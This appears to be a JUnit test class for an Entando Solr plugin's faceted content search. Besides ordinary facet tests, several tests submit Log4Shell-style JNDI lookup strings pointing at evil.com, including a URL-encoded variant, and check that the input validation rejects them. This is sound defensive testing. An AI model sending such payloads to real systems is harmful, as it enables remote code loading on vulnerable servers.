package org.entando.entando.plugins.jpsolr.aps.system.content;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.ArgumentMatchers.isNull;

import com.agiletec.aps.system.services.authorization.IAuthorizationManager;
import com.agiletec.aps.system.services.category.Category;
import com.agiletec.aps.system.services.category.CategoryManager;
import com.agiletec.aps.system.services.group.Group;
import com.agiletec.aps.system.services.lang.ILangManager;
import com.agiletec.aps.system.services.lang.Lang;
import com.agiletec.plugins.jacms.aps.system.services.content.widget.UserFilterOptionBean;
import java.util.List;
import org.entando.entando.aps.system.services.searchengine.SearchEngineFilter;
import org.entando.entando.plugins.jpsolr.aps.system.solr.ISolrSearchEngineManager;
import org.entando.entando.plugins.jpsolr.aps.system.solr.SolrSearchEngineManager;
import org.entando.entando.plugins.jpsolr.aps.system.solr.model.SolrFacetedContentsResult;
import org.entando.entando.plugins.jpsolr.aps.system.solr.model.SolrSearchEngineFilter;
import org.entando.entando.plugins.jpsolr.web.content.model.AdvRestContentListRequest;
import org.entando.entando.plugins.jpsolr.web.content.model.SolrFilter;
import org.entando.entando.web.common.exceptions.ValidationConflictException;
import org.entando.entando.web.common.model.Filter;
import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.ArgumentCaptor;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.mockito.junit.jupiter.MockitoExtension;

@ExtendWith(MockitoExtension.class)
class AdvContentFacetManagerTest {

    private static final String CATEGORY_1 = "category1";
    private static final String CATEGORY_2 = "category2";

    @Mock
    private CategoryManager categoryManager;
    @Mock
    private SolrSearchEngineManager searchEngineManager;
    @Mock
    private IAuthorizationManager authorizationManager;
    @Mock
    private ILangManager langManager;

    @InjectMocks
    private AdvContentFacetManager facetManager;

    @Test
    void shouldGetFacetResultWithBeansFilterAndNodeCodesAsList() throws Exception {
        UserFilterOptionBean filterOptionBean = Mockito.mock(UserFilterOptionBean.class);
        Mockito.when(filterOptionBean.extractFilter()).thenReturn(Mockito.mock(SearchEngineFilter.class));
        Mockito.when(categoryManager.getCategory(CATEGORY_1)).thenReturn(new Category());

        SearchEngineFilter[] baseFilters = new SearchEngineFilter[]{};
        List<String> facetNodeCodes = List.of(CATEGORY_1, CATEGORY_2);
        List<UserFilterOptionBean> filterOptionBeans = List.of(filterOptionBean);
        List<String> groups = List.of(Group.FREE_GROUP_NAME);
        facetManager.getFacetResult(baseFilters, facetNodeCodes, filterOptionBeans, groups);

        ArgumentCaptor<SearchEngineFilter[]> filtersCaptor = ArgumentCaptor.forClass(SearchEngineFilter[].class);
        ArgumentCaptor<SearchEngineFilter[]> categoryFiltersCaptor = ArgumentCaptor.forClass(
                SearchEngineFilter[].class);

        Mockito.verify(searchEngineManager).searchFacetedEntities(
                filtersCaptor.capture(), categoryFiltersCaptor.capture(), eq(groups));

        SearchEngineFilter[] filters = filtersCaptor.getValue();
        SearchEngineFilter[] categoryFilters = categoryFiltersCaptor.getValue();

        Assertions.assertEquals(1, filters.length);
        Assertions.assertEquals(1, categoryFilters.length);
        Assertions.assertEquals(CATEGORY_1, categoryFilters[0].getValue());
    }

    @Test
    void shouldGetFacetResultWithNullFilters() throws Exception {
        facetManager.getFacetResult(null, (List<String>) null, null, null);

        ArgumentCaptor<SearchEngineFilter[]> filtersCaptor = ArgumentCaptor.forClass(SearchEngineFilter[].class);

        Mockito.verify(searchEngineManager).searchFacetedEntities(
                filtersCaptor.capture(), (SearchEngineFilter[]) isNull(), isNull());

        SearchEngineFilter[] filters = filtersCaptor.getValue();
        Assertions.assertEquals(0, filters.length);
    }

    @Test
    void shouldGetFacetResultWithNodeCodesAsFilter() throws Exception {
        SearchEngineFilter[] nodeCodesFilter = new SearchEngineFilter[]{};
        facetManager.getFacetResult(null, nodeCodesFilter, null, null);
        Mockito.verify(searchEngineManager).searchFacetedEntities(
                any(SearchEngineFilter[].class), eq(nodeCodesFilter), isNull());
    }

    @Test
    void shouldRejectJndiInjectionInLang() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        request.setLang("${jndi:ldap://evil.com/exploit}");
        Mockito.when(langManager.getLangs()).thenReturn(List.of(createLang("en")));
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectNonExistentLangCode() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        request.setLang("zzz");
        Mockito.when(langManager.getLangs()).thenReturn(List.of(createLang("en")));
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldAcceptBlankLangCodeAndUseDefault() throws Exception {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        Mockito.when(langManager.getDefaultLang()).thenReturn(createLang("en"));
        Mockito.when(((ISolrSearchEngineManager) searchEngineManager)
                .searchFacetedEntities(
                        any(SolrSearchEngineFilter[][].class),
                        any(SolrSearchEngineFilter[].class),
                        any(List.class)))
                .thenReturn(new SolrFacetedContentsResult());
        facetManager.getFacetedContents(request, null);
        Mockito.verify(langManager, Mockito.never()).getLangs();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "${jndi:ldap://evil.com/exploit}",
            "${sys:java.version}",
            "%24%7Bjndi:ldap://evil.com%7D"
    })
    void shouldRejectInjectionInSort(String malicious) {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        request.setSort(malicious);
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInCsvCategories() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        request.setCsvCategories(new String[]{"${jndi:ldap://evil.com}"});
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInText() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        request.setText("${jndi:ldap://evil.com}");
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInFilterAttribute() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        SolrFilter filter = new SolrFilter("${jndi:ldap://evil.com}", "someValue", "eq");
        request.setFilters(new Filter[]{filter});
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInFilterEntityAttr() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        SolrFilter filter = new SolrFilter();
        filter.setEntityAttr("${jndi:ldap://evil.com}");
        filter.setOperator("eq");
        filter.setValue("test");
        request.setFilters(new Filter[]{filter});
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInFilterValue() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        SolrFilter filter = new SolrFilter("typeCode", "${jndi:ldap://evil.com}", "eq");
        filter.setEntityAttr("typeCode");
        request.setFilters(new Filter[]{filter});
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInDoubleFilterAttribute() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        SolrFilter filter = new SolrFilter("${jndi:ldap://evil.com}", "val", "eq");
        request.setDoubleFilters(new SolrFilter[][]{{filter}});
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    @Test
    void shouldRejectInjectionInSearchOption() {
        AdvRestContentListRequest request = new AdvRestContentListRequest();
        request.setSearchOption("${jndi:ldap://evil.com}");
        Assertions.assertThrows(ValidationConflictException.class,
                () -> facetManager.getFacetedContents(request, null));
    }

    private static Lang createLang(String code) {
        Lang lang = new Lang();
        lang.setCode(code);
        return lang;
    }
}
